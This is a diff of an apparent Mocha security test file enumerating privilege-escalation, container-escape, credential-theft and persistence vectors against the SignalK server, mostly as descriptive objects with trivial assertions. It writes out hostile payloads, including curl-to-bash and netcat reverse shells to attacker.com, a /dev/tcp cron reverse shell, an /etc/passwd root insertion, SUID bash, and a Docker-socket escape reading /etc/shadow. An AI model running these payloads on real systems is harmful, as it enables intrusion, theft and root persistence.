@@ -7,17 +7,16 @@
  * Attack Model: Attacker with limited access (network, low-priv user, or env control)
  */
 
-const { describe, it } = require('mocha');
-const { expect } = require('chai');
+const { describe, it } = require('mocha')
+const { expect } = require('chai')
 
-describe('Privilege Escalation & Root Access Vectors', function() {
-  this.timeout(30000);
+describe('Privilege Escalation & Root Access Vectors', function () {
+  this.timeout(30000)
 
   // ==================== SUDO ESCALATION ====================
 
-  describe('Sudo Privilege Escalation via npm', function() {
-
-    it('should test config.name manipulation for sudo trigger', function() {
+  describe('Sudo Privilege Escalation via npm', function () {
+    it('should test config.name manipulation for sudo trigger', function () {
       /**
        * CRITICAL: Sudo npm execution based on package name match
        * File: src/modules.ts lines 191-196, 216-218
@@ -36,16 +35,17 @@ describe('Privilege Escalation & Root Access Vectors', function() {
        */
       const sudoEscalation = {
         normalConfigName: 'signalk-server',
-        attackVector1: 'Restore backup with modified package.json where name = attacker-controlled',
+        attackVector1:
+          'Restore backup with modified package.json where name = attacker-controlled',
         attackVector2: 'Race condition between config load and npm spawn',
         attackVector3: 'Symlink attack on package.json file',
         result: 'npm install runs with sudo, scripts execute as root'
-      };
+      }
 
-      expect(sudoEscalation.normalConfigName).to.equal('signalk-server');
-    });
+      expect(sudoEscalation.normalConfigName).to.equal('signalk-server')
+    })
 
-    it('should test PATH manipulation for sudo/npm hijacking', function() {
+    it('should test PATH manipulation for sudo/npm hijacking', function () {
       /**
        * Attack: If PATH can be modified before spawn(), attacker can hijack sudo or npm
        *
@@ -59,12 +59,12 @@ describe('Privilege Escalation & Root Access Vectors', function() {
         evilSudo: '/tmp/evil/sudo - logs credentials and passes to real sudo',
         evilNpm: '/tmp/evil/npm - executes attacker payload',
         trigger: 'Any server module update via AppStore'
-      };
+      }
 
-      expect(pathHijack.attack).to.include('PATH');
-    });
+      expect(pathHijack.attack).to.include('PATH')
+    })
 
-    it('should test TOCTOU race in isTheServerModule check', function() {
+    it('should test TOCTOU race in isTheServerModule check', function () {
       /**
        * File: src/modules.ts lines 191, 216-218
        *
@@ -79,12 +79,12 @@ describe('Privilege Escalation & Root Access Vectors', function() {
         step2: 'Thread B: Modify config.name to match plugin name',
         step3: 'Thread A: spawn() now uses sudo because config.name matches',
         risk: 'Non-server module installed with sudo privileges'
-      };
+      }
 
-      expect(toctouRace.risk).to.include('sudo');
-    });
+      expect(toctouRace.risk).to.include('sudo')
+    })
 
-    it('should test npm install argument injection via version string', function() {
+    it('should test npm install argument injection via version string', function () {
       /**
        * File: src/modules.ts line 184
        *
@@ -93,24 +93,23 @@ describe('Privilege Escalation & Root Access Vectors', function() {
        * No validation of version string - could inject npm arguments
        */
       const versionInjection = [
-        '1.0.0 --ignore-scripts=false',  // Override security flag
+        '1.0.0 --ignore-scripts=false', // Override security flag
         '1.0.0" && curl attacker.com/shell.sh | bash && echo "',
-        '1.0.0 --registry=http://evil.com',  // Redirect to malicious registry
-        '$(id > /tmp/pwned)',  // Command substitution
-        '1.0.0; chmod +s /bin/bash;',  // SUID shell
-      ];
+        '1.0.0 --registry=http://evil.com', // Redirect to malicious registry
+        '$(id > /tmp/pwned)', // Command substitution
+        '1.0.0; chmod +s /bin/bash;' // SUID shell
+      ]
 
-      versionInjection.forEach(v => {
-        expect(v).to.be.a('string');
-      });
-    });
-  });
+      versionInjection.forEach((v) => {
+        expect(v).to.be.a('string')
+      })
+    })
+  })
 
   // ==================== ENVIRONMENT VARIABLE ATTACKS ====================
 
-  describe('Environment Variable Injection for Root Access', function() {
-
-    it('should test SECRETKEY environment variable exposure', function() {
+  describe('Environment Variable Injection for Root Access', function () {
+    it('should test SECRETKEY environment variable exposure', function () {
       /**
        * File: src/tokensecurity.js line 60
        *
@@ -132,12 +131,12 @@ describe('Privilege Escalation & Root Access Vectors', function() {
           'Kubernetes env dump',
           'Core dump analysis'
         ]
-      };
+      }
 
-      expect(secretKeyExposure.risk).to.include('JWT');
-    });
+      expect(secretKeyExposure.risk).to.include('JWT')
+    })
 
-    it('should test ADMINUSER/ADMINPASSWORD environment credentials', function() {
+    it('should test ADMINUSER/ADMINPASSWORD environment credentials', function () {
       /**
        * File: src/tokensecurity.js lines 66-87
        *
@@ -158,12 +157,12 @@ describe('Privilege Escalation & Root Access Vectors', function() {
           'Shell history if set via export'
         ],
         impact: 'Full admin access to SignalK'
-      };
+      }
 
-      expect(adminCredentials.format).to.include('password');
-    });
+      expect(adminCredentials.format).to.include('password')
+    })
 
-    it('should test SECURITYSTRATEGY arbitrary module load', function() {
+    it('should test SECURITYSTRATEGY arbitrary module load', function () {
       /**
        * CRITICAL: Arbitrary code execution via environment variable
        * File: src/security.ts line 210
@@ -183,12 +182,12 @@ describe('Privilege Escalation & Root Access Vectors', function() {
         `,
         trigger: 'Server startup',
         result: 'RCE as server process user (potentially root in Docker)'
-      };
+      }
 
-      expect(securityStrategyRCE.envVar).to.equal('SECURITYSTRATEGY');
-    });
+      expect(securityStrategyRCE.envVar).to.equal('SECURITYSTRATEGY')
+    })
 
-    it('should test SIGNALK_NODE_SETTINGS path traversal', function() {
+    it('should test SIGNALK_NODE_SETTINGS path traversal', function () {
       /**
        * File: src/config/config.ts lines 439-443
        *
@@ -201,20 +200,22 @@ describe('Privilege Escalation & Root Access Vectors', function() {
       const settingsPathAttack = {
         envVar: 'SIGNALK_NODE_SETTINGS',
         attacks: [
-          '/etc/passwd',  // Read arbitrary file (parsed as JSON fails, but info leak)
-          '/tmp/evil-settings.json',  // Attacker-controlled settings
-          '../../../attacker-settings.json',  // Path traversal
+          '/etc/passwd', // Read arbitrary file (parsed as JSON fails, but info leak)
+          '/tmp/evil-settings.json', // Attacker-controlled settings
+          '../../../attacker-settings.json' // Path traversal
         ],
         maliciousSettings: {
           security: { enabled: false },
-          interfaces: { /* inject malicious interface */ }
+          interfaces: {
+            /* inject malicious interface */
+          }
         }
-      };
+      }
 
-      expect(settingsPathAttack.envVar).to.equal('SIGNALK_NODE_SETTINGS');
-    });
+      expect(settingsPathAttack.envVar).to.equal('SIGNALK_NODE_SETTINGS')
+    })
 
-    it('should test DEFAULTENABLEDPLUGINS malicious plugin enable', function() {
+    it('should test DEFAULTENABLEDPLUGINS malicious plugin enable', function () {
       /**
        * File: src/interfaces/plugins.ts lines 70-71
        *
@@ -227,14 +228,15 @@ describe('Privilege Escalation & Root Access Vectors', function() {
       const defaultPluginsAttack = {
         envVar: 'DEFAULTENABLEDPLUGINS',
         attack: 'DEFAULTENABLEDPLUGINS=malicious-plugin,another-evil-plugin',
-        prerequisite: 'Malicious plugin already installed (via typosquatting, supply chain)',
+        prerequisite:
+          'Malicious plugin already installed (via typosquatting, supply chain)',
         result: 'Malicious plugin runs with server privileges on startup'
-      };
+      }
 
-      expect(defaultPluginsAttack.envVar).to.equal('DEFAULTENABLEDPLUGINS');
-    });
+      expect(defaultPluginsAttack.envVar).to.equal('DEFAULTENABLEDPLUGINS')
+    })
 
-    it('should test MFD_ADDRESS_SCRIPT command injection', function() {
+    it('should test MFD_ADDRESS_SCRIPT command injection', function () {
       /**
        * CRITICAL: Direct command execution from environment
        * File: src/interfaces/mfd_webapp.ts lines 82-85
@@ -251,21 +253,20 @@ describe('Privilege Escalation & Root Access Vectors', function() {
           'curl attacker.com/shell.sh | bash',
           'nc -e /bin/bash attacker.com 4444',
           'echo "root::0:0::/root:/bin/bash" >> /etc/passwd',
-          'chmod +s /bin/bash',
+          'chmod +s /bin/bash'
         ],
         frequency: 'Every 10 seconds (if MFD discovery enabled)',
         result: 'Persistent RCE with server privileges'
-      };
+      }
 
-      expect(mfdScriptRCE.frequency).to.include('10 seconds');
-    });
-  });
+      expect(mfdScriptRCE.frequency).to.include('10 seconds')
+    })
+  })
 
   // ==================== NPM CONFIGURATION ATTACKS ====================
 
-  describe('NPM Configuration Injection', function() {
-
-    it('should test .npmrc injection via backup restore', function() {
+  describe('NPM Configuration Injection', function () {
+    it('should test .npmrc injection via backup restore', function () {
       /**
        * File: src/config/config.ts lines 281-286
        *
@@ -291,32 +292,31 @@ ignore-scripts=false
           '_authToken - stolen tokens sent to attacker'
         ],
         result: 'All future npm operations compromised'
-      };
+      }
 
-      expect(npmrcInjection.backupContents['.npmrc']).to.include('registry');
-    });
+      expect(npmrcInjection.backupContents['.npmrc']).to.include('registry')
+    })
 
-    it('should test npm cache poisoning via SSRF', function() {
+    it('should test npm cache poisoning via SSRF', function () {
       /**
        * If SSRF can reach npm registry or cache server,
        * attacker can poison package cache
        */
       const cachePoison = {
-        ssrfTarget: 'http://127.0.0.1:4873',  // Verdaccio local registry
+        ssrfTarget: 'http://127.0.0.1:4873', // Verdaccio local registry
         attack: 'Upload malicious package version to local cache',
         trigger: 'Next npm install fetches poisoned package',
         result: 'RCE via postinstall script'
-      };
+      }
 
-      expect(cachePoison.ssrfTarget).to.include('127.0.0.1');
-    });
-  });
+      expect(cachePoison.ssrfTarget).to.include('127.0.0.1')
+    })
+  })
 
   // ==================== SYSTEMD / SOCKET ACTIVATION ====================
 
-  describe('Systemd and Socket Activation Attacks', function() {
-
-    it('should test LISTEN_FDS file descriptor hijacking', function() {
+  describe('Systemd and Socket Activation Attacks', function () {
+    it('should test LISTEN_FDS file descriptor hijacking', function () {
       /**
        * File: src/ports.ts lines 28-50
        *
@@ -328,15 +328,16 @@ ignore-scripts=false
        */
       const fdHijack = {
         envVar: 'LISTEN_FDS',
-        attack: 'Set LISTEN_FDS=2 and open attacker-controlled sockets on FD 3,4',
+        attack:
+          'Set LISTEN_FDS=2 and open attacker-controlled sockets on FD 3,4',
         result: 'Server listens on attacker-controlled sockets',
         risk: 'MITM all HTTP/HTTPS traffic'
-      };
+      }
 
-      expect(fdHijack.envVar).to.equal('LISTEN_FDS');
-    });
+      expect(fdHijack.envVar).to.equal('LISTEN_FDS')
+    })
 
-    it('should test RUN_FROM_SYSTEMD privilege implications', function() {
+    it('should test RUN_FROM_SYSTEMD privilege implications', function () {
       /**
        * File: src/serverroutes.ts line 520
        *
@@ -351,17 +352,16 @@ ignore-scripts=false
           'May enable privileged operations',
           'May change logging/error handling'
         ]
-      };
+      }
 
-      expect(systemdFlag.envVar).to.equal('RUN_FROM_SYSTEMD');
-    });
-  });
+      expect(systemdFlag.envVar).to.equal('RUN_FROM_SYSTEMD')
+    })
+  })
 
   // ==================== CONTAINER ESCAPE ====================
 
-  describe('Container Escape Vectors', function() {
-
-    it('should test Docker socket mount exploitation', function() {
+  describe('Container Escape Vectors', function () {
+    it('should test Docker socket mount exploitation', function () {
       /**
        * Common Docker deployment mounts docker.sock for updates
        * SSRF to Docker API = container escape
@@ -380,12 +380,12 @@ ignore-scripts=false
           Cmd: ['/bin/sh', '-c', 'cat /host/etc/shadow > /host/tmp/shadow'],
           HostConfig: { Binds: ['/:/host'] }
         }
-      };
+      }
 
-      expect(dockerEscape.socketPath).to.include('docker.sock');
-    });
+      expect(dockerEscape.socketPath).to.include('docker.sock')
+    })
 
-    it('should test Kubernetes service account token theft', function() {
+    it('should test Kubernetes service account token theft', function () {
       /**
        * In Kubernetes, service account token is mounted by default
        * If SSRF can reach Kubernetes API, full cluster compromise
@@ -399,12 +399,12 @@ ignore-scripts=false
           '3. Create privileged pod',
           '4. Escape to node'
         ]
-      };
+      }
 
-      expect(k8sEscape.tokenPath).to.include('serviceaccount');
-    });
+      expect(k8sEscape.tokenPath).to.include('serviceaccount')
+    })
 
-    it('should test /proc filesystem exploitation', function() {
+    it('should test /proc filesystem exploitation', function () {
       /**
        * /proc can leak sensitive information and enable attacks
        */
@@ -417,12 +417,12 @@ ignore-scripts=false
           '/proc/1/root - if PID 1 is accessible, host filesystem'
         ],
         accessVia: 'Path traversal in backup restore, resource API, or SSRF'
-      };
+      }
 
-      expect(procExploit.targets.length).to.be.above(0);
-    });
+      expect(procExploit.targets.length).to.be.above(0)
+    })
 
-    it('should test cgroup escape via release_agent', function() {
+    it('should test cgroup escape via release_agent', function () {
       /**
        * Classic container escape via cgroup release_agent
        * Requires CAP_SYS_ADMIN (common in privileged containers)
@@ -436,17 +436,16 @@ ignore-scripts=false
           '4. Trigger release_agent by killing process in cgroup'
         ],
         accessVia: 'RCE via backup restore, plugin, or command injection'
-      };
+      }
 
-      expect(cgroupEscape.prerequisite).to.include('privileged');
-    });
-  });
+      expect(cgroupEscape.prerequisite).to.include('privileged')
+    })
+  })
 
   // ==================== SUID/CAPABILITIES ABUSE ====================
 
-  describe('SUID and Linux Capabilities Abuse', function() {
-
-    it('should test node process capabilities', function() {
+  describe('SUID and Linux Capabilities Abuse', function () {
+    it('should test node process capabilities', function () {
       /**
        * If node has capabilities like CAP_NET_BIND_SERVICE,
        * it may have elevated privileges
@@ -459,12 +458,12 @@ ignore-scripts=false
         ],
         checkCommand: 'getpcaps $(pgrep node)',
         risk: 'Capabilities can enable privilege escalation'
-      };
+      }
 
-      expect(capsAbuse.commonCaps.length).to.be.above(0);
-    });
+      expect(capsAbuse.commonCaps.length).to.be.above(0)
+    })
 
-    it('should test SUID binary exploitation via backup', function() {
+    it('should test SUID binary exploitation via backup', function () {
       /**
        * If backup restore can write SUID binaries,
        * attacker gets root shell
@@ -474,17 +473,16 @@ ignore-scripts=false
         payload: 'ELF binary that executes /bin/sh',
         postRestore: 'chmod +s /tmp/suid-shell',
         risk: 'If ncp preserves permissions or symlinks to SUID...'
-      };
+      }
 
-      expect(suidExploit.zipEntry).to.include('..');
-    });
-  });
+      expect(suidExploit.zipEntry).to.include('..')
+    })
+  })
 
   // ==================== KERNEL EXPLOITATION ====================
 
-  describe('Kernel-Level Attack Vectors', function() {
-
-    it('should test /dev access via path traversal', function() {
+  describe('Kernel-Level Attack Vectors', function () {
+    it('should test /dev access via path traversal', function () {
       /**
        * Access to /dev can enable kernel exploitation
        */
@@ -496,12 +494,12 @@ ignore-scripts=false
           '/dev/null - used for fd tricks'
         ],
         accessVia: 'Path traversal in backup restore'
-      };
+      }
 
-      expect(devAccess.targets.length).to.be.above(0);
-    });
+      expect(devAccess.targets.length).to.be.above(0)
+    })
 
-    it('should test kernel module loading via file write', function() {
+    it('should test kernel module loading via file write', function () {
       /**
        * If attacker can write to /lib/modules/... or /etc/modules-load.d/,
        * they can load kernel modules on reboot
@@ -513,17 +511,16 @@ ignore-scripts=false
           '/etc/modprobe.d/evil.conf'
         ],
         risk: 'Kernel-level rootkit persistence'
-      };
+      }
 
-      expect(kernelModule.risk).to.include('rootkit');
-    });
-  });
+      expect(kernelModule.risk).to.include('rootkit')
+    })
+  })
 
   // ==================== CREDENTIAL HARVESTING ====================
 
-  describe('Credential Harvesting for Privilege Escalation', function() {
-
-    it('should test security.json credential extraction', function() {
+  describe('Credential Harvesting for Privilege Escalation', function () {
+    it('should test security.json credential extraction', function () {
       /**
        * security.json contains bcrypt hashed passwords
        * If readable, offline cracking possible
@@ -531,18 +528,16 @@ ignore-scripts=false
       const credentialHarvest = {
         file: '$CONFIG_PATH/security.json',
         contents: {
-          users: [
-            { username: 'admin', password: '$2a$10$...' }
-          ]
+          users: [{ username: 'admin', password: '$2a$10$...' }]
         },
         attack: 'hashcat -m 3200 hashes.txt wordlist.txt',
         accessVia: 'Path traversal, backup download, SSRF to file://'
-      };
+      }
 
-      expect(credentialHarvest.file).to.include('security.json');
-    });
+      expect(credentialHarvest.file).to.include('security.json')
+    })
 
-    it('should test JWT secret extraction from memory', function() {
+    it('should test JWT secret extraction from memory', function () {
       /**
        * JWT secret held in memory - if memory dump possible,
        * secret can be extracted
@@ -556,12 +551,12 @@ ignore-scripts=false
         ],
         target: 'JWT secretKey in tokensecurity.js configuration object',
         result: 'Forge any JWT token including admin'
-      };
+      }
 
-      expect(memoryDump.result).to.include('Forge');
-    });
+      expect(memoryDump.result).to.include('Forge')
+    })
 
-    it('should test SSH key theft for lateral movement', function() {
+    it('should test SSH key theft for lateral movement', function () {
       /**
        * If SSH keys present on server, attacker can pivot to other systems
        */
@@ -570,21 +565,20 @@ ignore-scripts=false
           '~/.ssh/id_rsa',
           '~/.ssh/id_ed25519',
           '/root/.ssh/id_rsa',
-          '/etc/ssh/ssh_host_*_key'  // Server keys for MITM
+          '/etc/ssh/ssh_host_*_key' // Server keys for MITM
         ],
         accessVia: 'Path traversal, backup restore symlinks',
         result: 'SSH access to other systems trusting these keys'
-      };
+      }
 
-      expect(sshKeyTheft.targets.length).to.be.above(0);
-    });
-  });
+      expect(sshKeyTheft.targets.length).to.be.above(0)
+    })
+  })
 
   // ==================== PERSISTENCE MECHANISMS ====================
 
-  describe('Root-Level Persistence Mechanisms', function() {
-
-    it('should test cron job persistence', function() {
+  describe('Root-Level Persistence Mechanisms', function () {
+    it('should test cron job persistence', function () {
       /**
        * Write to cron directories for persistent access
        */
@@ -596,12 +590,12 @@ ignore-scripts=false
         ],
         payload: '* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1',
         accessVia: 'Zip slip in backup restore'
-      };
+      }
 
-      expect(cronPersistence.payload).to.include('bash');
-    });
+      expect(cronPersistence.payload).to.include('bash')
+    })
 
-    it('should test systemd service persistence', function() {
+    it('should test systemd service persistence', function () {
       /**
        * Create malicious systemd service
        */
@@ -622,12 +616,12 @@ Restart=always
 WantedBy=multi-user.target
         `,
         activation: 'systemctl daemon-reload && systemctl enable backdoor'
-      };
+      }
 
-      expect(systemdPersistence.payload).to.include('ExecStart');
-    });
+      expect(systemdPersistence.payload).to.include('ExecStart')
+    })
 
-    it('should test init script persistence', function() {
+    it('should test init script persistence', function () {
       /**
        * Legacy init scripts for persistence
        */
@@ -638,48 +632,42 @@ WantedBy=multi-user.target
           '/etc/rc.d/rc.local'
         ],
         risk: 'Survives reboot, runs as root'
-      };
+      }
 
-      expect(initPersistence.risk).to.include('root');
-    });
+      expect(initPersistence.risk).to.include('root')
+    })
 
-    it('should test LD_PRELOAD library injection', function() {
+    it('should test LD_PRELOAD library injection', function () {
       /**
        * LD_PRELOAD can inject code into any process
        */
       const ldPreload = {
-        targets: [
-          '/etc/ld.so.preload',
-          'LD_PRELOAD environment variable'
-        ],
+        targets: ['/etc/ld.so.preload', 'LD_PRELOAD environment variable'],
         payload: 'Shared library that hooks functions and adds backdoor',
         risk: 'All processes load malicious library'
-      };
+      }
 
-      expect(ldPreload.risk).to.include('All processes');
-    });
+      expect(ldPreload.risk).to.include('All processes')
+    })
 
-    it('should test PAM module backdoor', function() {
+    it('should test PAM module backdoor', function () {
       /**
        * PAM modules can backdoor authentication
        */
       const pamBackdoor = {
-        targets: [
-          '/lib/security/pam_backdoor.so',
-          '/etc/pam.d/common-auth'
-        ],
+        targets: ['/lib/security/pam_backdoor.so', '/etc/pam.d/common-auth'],
         attack: 'Add auth sufficient pam_backdoor.so to PAM config',
         risk: 'Any password works for any user'
-      };
+      }
 
-      expect(pamBackdoor.risk).to.include('password');
-    });
-  });
+      expect(pamBackdoor.risk).to.include('password')
+    })
+  })
 
   // ==================== SUMMARY ====================
 
-  describe('Privilege Escalation Test Summary', function() {
-    it('should document all privilege escalation vectors tested', function() {
+  describe('Privilege Escalation Test Summary', function () {
+    it('should document all privilege escalation vectors tested', function () {
       const privEscVectors = {
         'Sudo Escalation': [
           'config.name manipulation',
@@ -713,38 +701,35 @@ WantedBy=multi-user.target
           'Node capabilities abuse',
           'SUID binary via backup'
         ],
-        'Kernel-Level': [
-          '/dev access',
-          'Kernel module loading'
-        ],
+        'Kernel-Level': ['/dev access', 'Kernel module loading'],
         'Credential Harvesting': [
           'security.json extraction',
           'JWT secret from memory',
           'SSH key theft'
         ],
-        'Persistence': [
+        Persistence: [
           'Cron job',
           'Systemd service',
           'Init scripts',
           'LD_PRELOAD',
           'PAM backdoor'
         ]
-      };
+      }
 
-      let totalVectors = 0;
-      Object.values(privEscVectors).forEach(vectors => {
-        totalVectors += vectors.length;
-      });
+      let totalVectors = 0
+      Object.values(privEscVectors).forEach((vectors) => {
+        totalVectors += vectors.length
+      })
 
-      console.log('\n  ========================================');
-      console.log('  Privilege Escalation Test Summary');
-      console.log('  ========================================');
-      console.log(`  Total Categories: ${Object.keys(privEscVectors).length}`);
-      console.log(`  Total Vectors: ${totalVectors}`);
-      console.log('  ========================================\n');
+      console.log('\n  ========================================')
+      console.log('  Privilege Escalation Test Summary')
+      console.log('  ========================================')
+      console.log(`  Total Categories: ${Object.keys(privEscVectors).length}`)
+      console.log(`  Total Vectors: ${totalVectors}`)
+      console.log('  ========================================\n')
 
-      expect(Object.keys(privEscVectors).length).to.equal(9);
-      expect(totalVectors).to.be.above(30);
-    });
-  });
-});
+      expect(Object.keys(privEscVectors).length).to.equal(9)
+      expect(totalVectors).to.be.above(30)
+    })
+  })
+})
